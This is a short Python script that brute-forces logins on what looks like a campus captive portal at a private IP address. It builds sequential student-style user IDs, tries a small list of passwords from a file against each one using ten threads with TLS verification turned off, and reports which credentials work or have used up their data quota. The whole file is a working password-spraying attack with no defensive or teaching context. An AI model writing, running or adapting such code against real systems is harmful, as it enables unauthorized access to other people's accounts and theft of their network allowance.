from multiprocessing.pool import ThreadPool as Pool
from threading import Thread, current_thread
import urllib.request
import urllib.parse
import ssl

def get_next_id():
    for z in range(13,17):
        for i in range(1,800):
            userid = "f20" + str(z)
            if(i<10): userid+="00"
            elif(i<100): userid+="0"
            yield userid+str(i)

def iterate_for_one_id(j):
    for i in range(len(parray)):
        #print(j);
        dataToSend = urllib.parse.urlencode({'mode': '191','isAccessDenied': '', 'url': '', 'username': j, 'password': parray[i], 'saveinfo': ''  }).encode('utf-8')
        req = urllib.request.Request(url, dataToSend)
        response = urllib.request.urlopen(req,context=context)
        the_page = response.read()
        lineStr = str( the_page, encoding='utf8' )
        if "logged in" in lineStr:
            print("Working " + j + "  " + parray[i]);
        if "data transfer" in lineStr:
            print("Data Limit Exceeded " + j + "  " + parray[i]);

fo = open("password.txt", "r", 1)
parray = []
for i in range(11) :
    parray.append(fo.readline())
fo.close()

pool = Pool(10)

generator = get_next_id()

context = ssl._create_unverified_context()
url='https://10.1.0.10:8090/httpclient.html'

for j in generator:
    pool.apply_async(iterate_for_one_id,(j,))
pool.close()
pool.join()
print("Completed Task")
    
    

